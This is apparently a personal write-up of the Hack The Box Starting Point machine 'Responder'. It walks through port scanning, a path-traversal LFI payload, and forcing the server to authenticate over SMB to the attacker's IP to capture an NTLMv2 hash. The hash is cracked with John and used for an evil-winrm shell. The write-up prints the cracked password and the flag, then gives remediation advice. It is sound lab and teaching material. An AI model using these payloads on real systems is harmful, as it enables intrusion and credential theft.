# HTB - Responder

**Platform:** Hack The Box — Starting Point, Tier 1  
**OS:** Windows  
**Difficulty:** Very Easy  
**Status:** Pwned ✅

---

## Summary

Responder is a Windows machine with a web application vulnerable to Local File Inclusion (LFI). By abusing the LFI to force the server to connect to our machine via SMB, we can capture the Administrator's NTLMv2 hash with Responder, crack it with John the Ripper, and log in remotely via WinRM.

---

## Tools Used

- `nmap` — port scanning
- `responder` — NTLMv2 hash capture
- `john` — password cracking
- `evil-winrm` — remote shell via WinRM

---

## Steps

### 1. Port Scanning

```bash
nmap -sV -p- --min-rate 5000 10.129.50.50
```

Result:

```
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.52 (Win64)
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0
```

Port 80 is a web server, port 5985 is WinRM — useful for remote access later.

### 2. Web Application — Virtual Host

Visiting `http://10.129.50.50` redirects to `unika.htb`. Added the hostname to /etc/hosts:

```bash
echo "10.129.50.50 unika.htb" | sudo tee -a /etc/hosts
```

### 3. LFI Discovery

Clicking the language switcher changes the URL to:

```
http://unika.htb/index.php?page=german.html
```

The `page` parameter loads files directly. Tested LFI by pointing to the Windows hosts file:

```
http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts
```

The file content was displayed — LFI confirmed.

### 4. NTLM Hash Capture with Responder

Started Responder on the VPN interface:

```bash
sudo responder -I tun0
```

Then triggered the LFI to force the server to authenticate to our machine via SMB:

```
http://unika.htb/index.php?page=//10.10.14.54/test
```

Responder captured the NTLMv2 hash for **Administrator**.

### 5. Cracking the Hash

Copied the hash from Responder logs and cracked it with John:

```bash
cp /usr/share/responder/logs/SMB-NTLMv2-SSP-10.129.50.50.txt hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Result: `Administrator : badminton`

### 6. Remote Access via WinRM

```bash
evil-winrm -i 10.129.50.50 -u Administrator -p badminton
```

Logged in as Administrator.

### 7. Flag

```bash
type C:\Users\mike\Desktop\flag.txt
```

```
ea81b7afddd03efaa0945333ed147fac
```

---

## What I Learned

- LFI can be abused to force the server to make outbound SMB connections
- Windows authenticates automatically via NTLM on SMB — that hash can be captured and cracked
- Weak passwords are crackable in seconds with John the Ripper and rockyou.txt
- WinRM on port 5985 gives a full remote shell with valid credentials

---

## Remediation

- Validate the `page` parameter — never load files from user input directly
- Use strong passwords not in common wordlists
- Restrict WinRM access to trusted IPs only
- Disable NTLM where not needed
